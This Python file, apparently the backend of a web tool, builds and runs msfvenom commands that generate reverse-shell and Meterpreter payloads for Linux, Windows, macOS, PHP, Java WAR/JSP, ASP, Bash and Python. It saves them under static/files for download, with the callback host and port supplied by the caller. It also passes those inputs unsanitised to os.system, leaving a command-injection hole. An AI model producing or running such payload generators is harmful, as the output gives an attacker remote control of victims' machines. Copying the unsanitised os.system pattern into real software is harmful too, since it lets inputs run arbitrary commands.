import os


def Trojan_exe(ip="127.0.0.1",port="",name="test"):
    str1="msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o "%(ip,port)
    str2=" static/files/%s"%(name)
    #static/files/test.txt
    str=str1+str2
    try:
        os.system(str)
    except:
        return 1
    return 0
def Trojan(ip="127.0.0.1",port="",name="test",env="linux"):
    str_p="msfvenom  -p "
    name=" static/files/%s"%(name)
    str_erro="input error"
    if env=="linux":
        str_env="linux/x86/meterpreter/reverse_tcp"
        str_type=" -f elf  -o %s.elf"%(name)
    elif env=="windows":
        str_env="windows/meterpreter/reverse_tcp"
        str_type=" -f exe  -o %s.exe"%(name)
    elif env=="windows64":
        str_env="windows/x64/meterpreter/reverse_tcp"
        str_type=" -f exe  -o %s.exe"%(name)
    elif env=="mac":
        str_env="osx/x86/shell_reverse_tcp"
        str_type=" -f macho  -o %s.macho"%(name)
    elif env=="php":
        str_env="php/meterpreter_reverse_tcp"
        str_type=" -f raw   -o %s.php"%(name)
    elif env=="WAR":
        str_env="java/jsp_shell_reverse_tcp"
        str_type=" -f war  -o %s.war"%(name)
    elif env=="Python"or env=="python":
        str_env="cmd/unix/reverse_python"
        str_type=" -f raw -o %s.py"%(name)
    elif env=="Bash"or env=="shell":
        str_env="cmd/unix/reverse_bash"
        str_type=" -f raw -o %s.sh"%(name)
    elif env=="jsp"or env=="JSP":
        str_env="java/jsp_shell_reverse_tcp"
        str_type=" -f raw -o %s.jsp"%(name)
    elif env=="asp":
        str_env="windows/meterpreter/reverse_tcp"
        str_type=" -f asp -o %s.asp"%(name)
    else:
        return str_erro
    str_lhost=" LHOST=%s"%(ip)
    str_lport=" LPORT=%s"%(port)
    str_other=" "#自定义选项
    
    str_end=str_p+str_env+str_lhost+str_lport+str_type
    print(str_end)
    # str1="msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o "%(ip,port)
    
    # #static/files/test.txt
    
    try:
        os.system(str_end)
    except:
        return 1
    return str_end
def judge_env(env): 
    if env=="linux":
        return "elf"
    elif env=="windows":
        return "exe"
    elif env=="windows64":
        return "exe"
    elif env=="mac":
        return "macho"
    elif env=="php":
        return "php"
    elif env=="WAR":
        return "war"
    elif env=="Python"or env=="python":
        return "py"
    elif env=="Bash"or env=="shell":
        return "sh"
    elif env=="jsp"or env=="JSP":
        return "jsp"
    elif env=="asp":
        return "asp"  
    else:
        return "error"